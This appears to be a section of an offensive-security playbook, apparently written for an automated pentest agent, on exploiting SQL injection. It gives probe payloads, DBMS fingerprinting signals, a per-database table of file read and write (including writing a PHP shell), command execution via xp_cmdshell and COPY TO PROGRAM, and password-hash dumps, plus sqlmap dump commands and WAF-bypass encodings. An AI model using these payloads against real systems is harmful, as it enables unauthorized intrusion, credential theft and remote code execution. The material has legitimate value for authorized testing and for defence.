# Web And API Operations: Attack Primitives: Traditional Web Vulnerabilities: SQL Injection — Beyond The Basics

> Apply [../module-continuity.md](../module-continuity.md). Keep the same engagement and parent path as the calling route. Load this scene only when current evidence supports its prerequisites.

### SQL Injection — Beyond The Basics

#### The Practical Approach

Don't start with sqlmap. Start with manual confirmation, then use automation strategically.

**Step 1 — Find the parameter**: Every user-controlled input that might reach a database: GET/POST parameters, cookies, HTTP headers (User-Agent, Referer, X-Forwarded-For, custom headers), JSON/XML body fields, file upload names, URL path segments.

**Step 2 — Confirm the injection class with a minimal test**:

| Injection Context | Test Payload | Expected Response Difference |
|---|---|---|
| String (single-quoted) | `'` | Error, different page, or no response |
| String (double-quoted) | `"` | Same as above |
| Integer | `-1` or `0` | Different result from normal positive value |
| Boolean (WHERE clause) | `' AND '1'='1` vs `' AND '1'='2` | Content difference between true and false |
| ORDER BY / LIMIT | `1` vs `99999999` or `1 ASC` vs `1 DESC` | Different ordering or result count |
| LIKE / SEARCH | `%' AND 1=1--` vs `%' AND 1=2--` | Different result sets |
| INSERT / UPDATE | `', (SELECT ...), '` in a value field | Subquery result appears in response or error |

**Step 3 — Determine database type before exploiting**:

| Signal | Indicates |
|---|---|
| Error mentions "MySQL", "MariaDB", "mysql_fetch" | MySQL/MariaDB |
| Error mentions "PostgreSQL", "pg_", "psql" | PostgreSQL |
| Error mentions "Microsoft", "SQL Server", "ODBC SQL Server", "mssql" | MSSQL |
| Error mentions "ORA-", "PL/SQL", "Oracle" | Oracle |
| Error mentions "SQLite", "sqlite" | SQLite |
| `@@version` returns version | MSSQL, MySQL |
| `version()` returns version | MySQL, PostgreSQL, MariaDB |
| `/*!50000 ...*/` executes — versioned comment | MySQL |
| `--` vs `#` vs `;--` comment behavior | MySQL: `#` or `-- `; MSSQL: `--`; PostgreSQL: `--`; Oracle: `--` |
| String concat: `'a' \|\| 'b'` works | PostgreSQL, Oracle; MySQL needs `CONCAT()`, MSSQL uses `+` |

**Step 4 — Choose exploitation path by database**:

| DBMS | File Read | File Write | Command Execution | Hash Dump |
|---|---|---|---|---|
| MySQL | `LOAD_FILE('/etc/passwd')` | `SELECT ... INTO OUTFILE '/var/www/html/shell.php'` | UDF plugin (requires plugin_dir writable) | `SELECT user,authentication_string FROM mysql.user` |
| PostgreSQL | `CREATE TABLE t(c text); COPY t FROM '/etc/passwd'` | `COPY t TO '/tmp/out'` | `COPY (SELECT '') TO PROGRAM 'id'` (requires pg_execute_server_program) | `SELECT usename,passwd FROM pg_shadow` |
| MSSQL | `OPENROWSET(BULK 'C:\...')` or `xp_fileexist` | `xp_cmdshell 'echo ... > path'` | `xp_cmdshell` (disabled by default, enable via `sp_configure`), `sp_OACreate` | `SELECT name,password_hash FROM sys.sql_logins` |
| Oracle | `UTL_FILE`, external tables | `UTL_FILE` | `DBMS_SCHEDULER`, Java stored procedures | `SELECT username,password FROM dba_users` |
| SQLite | `readfile('/etc/passwd')` (requires extension) | `writefile('/tmp/x','data')` (requires extension) | `load_extension()` | Bypass auth by overwriting SQLite DB file |

**Using sqlmap tactically**: 

Don't run `sqlmap -u <url>` with default settings on a production target. Instead:
```bash
# First: confirm injection manually
# Then: targeted sqlmap with bounded risk
sqlmap -u "<url>" --dbms=<identified_dbms> --risk=2 --level=3 --technique=<B|E|U|S|T> --batch --delay=0.5 --random-agent
# Get databases
sqlmap -u "<url>" --dbs
# Dump specific table (not whole DB)
sqlmap -u "<url>" -D <database> -T <table> --dump --stop=10
# For WAF bypass: --tamper=<tamper_script>
sqlmap -u "<url>" --tamper=space2comment,charencode,randomcase --level=5
```

**WAF Bypass Patterns** (when sqlmap tampers fail):
```
space → /**/, +, %09, %0a, %0d, %0c, (comment)/**/between/**/words
AND/OR → &&, ||, &&, %26%26
UNION SELECT → UNION ALL SELECT, UNION/**/SELECT, /*!50000Union*/ Select
' or 1=1-- → ' || 1=1--, ' or 2>1--, ' or 'x'='x
```


## Scene Exit

Return result classification, evidence, changed assumptions, affected paths, persistent changes, and the next parent-path decision.
